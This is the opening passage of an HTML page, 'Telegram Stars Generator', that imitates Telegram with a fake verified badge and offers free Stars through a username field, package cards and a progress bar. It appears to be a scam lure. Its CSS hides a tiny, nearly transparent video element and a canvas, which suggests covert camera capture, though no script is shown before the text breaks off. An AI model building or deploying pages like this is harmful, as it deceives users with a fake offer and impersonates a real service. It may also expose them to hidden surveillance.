<!DOCTYPE html>
<html lang="ps" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Stars Generator</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: linear-gradient(135deg, #0088cc 0%, #005580 100%); color: #333333; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 15px; }
        
        .container { width: 100%; max-width: 400px; background-color: #ffffff; border-radius: 30px; padding: 25px 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); display: flex; flex-direction: column; gap: 18px; margin-top: 20px; margin-bottom: 20px; position: relative; z-index: 5; }

        .header { display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 5px; }
        .tg-logo { font-size: 32px; }
        .tg-title { font-size: 28px; font-weight: 800; color: #0088cc; display: flex; align-items: center; gap: 6px; }
        .verified-badge { color: #0088cc; font-size: 20px; }

        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; text-align: center; background-color: #f8f9fa; padding: 12px 6px; border-radius: 16px; border: 1px solid #e9ecef; }
        .stat-val { font-size: 16px; font-weight: 800; color: #1c2733; }
        .stat-lbl { font-size: 11px; color: #8e949a; margin-top: 2px; }

        .card-label { font-size: 14px; font-weight: 700; color: #1c2733; display: flex; align-items: center; gap: 6px; }

        .input-wrapper { background-color: #f4f4f5; border: 1px solid #e4e4e7; border-radius: 16px; padding: 14px 16px; display: flex; align-items: center; gap: 8px; }
        .input-prefix { color: #8e949a; font-weight: 600; font-size: 16px; }
        .input-box { width: 100%; background: transparent; border: none; outline: none; font-size: 15px; font-weight: 600; color: #1c2733; }

        .grid-stars { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .star-card { background-color: #f4f4f5; border: 1px solid #e4e4e7; padding: 16px 8px; border-radius: 18px; text-align: center; cursor: pointer; position: relative; transition: all 0.2s ease; }
        .star-card.active { background: linear-gradient(135deg, #0088cc, #006699); border-color: #0088cc; color: #ffffff; }
        .star-card.active .s-title, .star-card.active .s-sub { color: #ffffff !important; }
        .pop-badge { position: absolute; top: -10px; left: 50%; transform: translateX(-50%); background-color: #ff3b30; color: white; font-size: 8px; font-weight: 800; padding: 3px 8px; border-radius: 10px; text-transform: uppercase; pointer-events: none; letter-spacing: 0.5px; }
        .s-title { font-size: 18px; font-weight: 800; color: #1c2733; pointer-events: none; }
        .s-sub { font-size: 11px; color: #8e949a; margin-top: 4px; pointer-events: none; }

        .speed-box { display: flex; align-items: center; justify-content: space-between; background-color: #ffffff; }
        .speed-label { font-size: 14px; font-weight: 700; color: #1c2733; display: flex; align-items: center; gap: 6px; }
        .speed-badge { background-color: #0088cc; color: white; padding: 6px 16px; border-radius: 20px; font-size: 12px; font-weight: 700; }
        
        .slider-container { width: 100%; margin-top: -5px; }
        .slider { -webkit-appearance: none; width: 100%; height: 6px; border-radius: 5px; background: #e4e4e7; outline: none; }
        .slider::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 20px; height: 20px; border-radius: 50%; background: #0088cc; cursor: pointer; border: 2px solid white; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }

        .generate-btn { background: linear-gradient(135deg, #0088cc, #006699); color: white; width: 100%; padding: 16px; border: none; border-radius: 25px; font-size: 16px; font-weight: 700; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; box-shadow: 0 8px 20px rgba(0, 136, 204, 0.3); transition: 0.2s; position: relative; z-index: 10; margin-top: 5px; }
        .generate-btn:active { transform: scale(0.98); }
        .generate-btn:disabled { opacity: 0.6; cursor: not-allowed; }

        .error-box { display: none; background-color: #ffe5e5; border: 1px solid #ff4d4d; border-radius: 14px; padding: 12px; text-align: center; font-size: 13px; color: #d8000c; font-weight: bold; }

        .process-box { display: none; background-color: #f4f4f5; border: 1px solid #e4e4e7; border-radius: 14px; padding: 12px; text-align: center; }
        .process-text { display: flex; justify-content: space-between; font-size: 13px; color: #8e949a; margin-bottom: 8px; font-weight: 600; }
        .progress-bar-container { width: 100%; background-color: #e4e4e7; height: 8px; border-radius: 4px; overflow: hidden; }
        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #0088cc, #005580); transition: width 0.3s ease; }

        .success-box { display: none; background-color: #e6f4ea; border: 1px solid #34a853; border-radius: 14px; padding: 12px; text-align: center; font-size: 13px; color: #137333; font-weight: bold; }

        .footer-info { text-align: center; font-size: 11px; color: #8e949a; display: flex; align-items: center; justify-content: center; gap: 12px; font-weight: 600; margin-top: 5px; }

        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
        canvas { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <span class="tg-logo">✈️</span>
            <div class="tg-title">Telegram <span class="verified-badge">☑️</span></div>
        </div>

        <div class="stats-grid">
